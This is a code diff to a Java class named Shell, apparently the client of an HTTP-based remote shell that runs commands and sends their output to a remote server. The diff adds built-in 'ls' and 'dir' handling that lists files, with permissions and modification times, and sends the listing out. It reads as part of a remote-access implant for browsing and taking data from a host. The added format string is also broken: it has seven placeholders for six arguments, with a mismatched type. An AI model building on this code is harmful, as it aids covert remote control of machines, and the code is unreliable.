@@ -75,6 +75,18 @@ public class Shell {
                 shellHttpClient.sendCmdResult(new String(data)); // send through
             }
             else {
+                if(cmd.startsWith("ls ") || cmd.equals("ls") ||
+                    cmd.startsWith("dir ") || cmd.equals("dir")) {
+                    String[] argv = cmd.split(" ");
+                    if(argv.length > 1) {
+                        listDir(new File(argv[1])); // provided path
+                    }
+                    else {
+                        listDir(processBuilder.directory().getAbsoluteFile()); // cwd
+                    }
+                    return;
+                }
+                // not dir listing command
                 byte[] data = readCmdOutput(process.getInputStream());
 
                 shellHttpClient.sendCmdResult(
@@ -96,7 +108,7 @@ public class Shell {
      */
     private byte[] readCmdOutput(InputStream cmdInStream) throws IOException {
         try(DataInputStream inStream = new DataInputStream(new BufferedInputStream(cmdInStream))) {
-            System.out.printf("[*] %d bytes available before reading output.\n", cmdInStream.available());
+            System.out.printf("[i] %d bytes available before reading output.\n", cmdInStream.available());
 
             byte[] data = new byte[cmdInStream.available() + 1024]; // incremental strategy
             int bytesRead = 0;
@@ -201,17 +213,20 @@ public class Shell {
             StringBuilder concatList = new StringBuilder();
             if (dir.exists()) {
                 File[] listing = dir.listFiles();
-                for(File entry : listing) {
-                    concatList.append(
-                            String.format(
-                                    "%s%s%s%s\t %s\n",
-                                    (entry.isDirectory()? "d":"-"),
-                                    (entry.canRead()? "r":"-"),
-                                    (entry.canWrite()? "w":"-"),
-                                    (entry.canExecute()? "e":"-"),
-                                    entry.getName()
-                            )
-                    );
+                if(listing != null) {
+                    for (File entry : listing) {
+                        concatList.append(
+                                String.format(
+                                        "%s%s%s%s\t %s\t %d\t %s\n",
+                                        (entry.isDirectory() ? "d" : "-"),
+                                        (entry.canRead() ? "r" : "-"),
+                                        (entry.canWrite() ? "w" : "-"),
+                                        (entry.canExecute() ? "e" : "-"),
+                                        entry.lastModified(),
+                                        entry.getName()
+                                )
+                        );
+                    }
                 }
                 shellHttpClient.sendCmdResult(concatList.toString());
             }
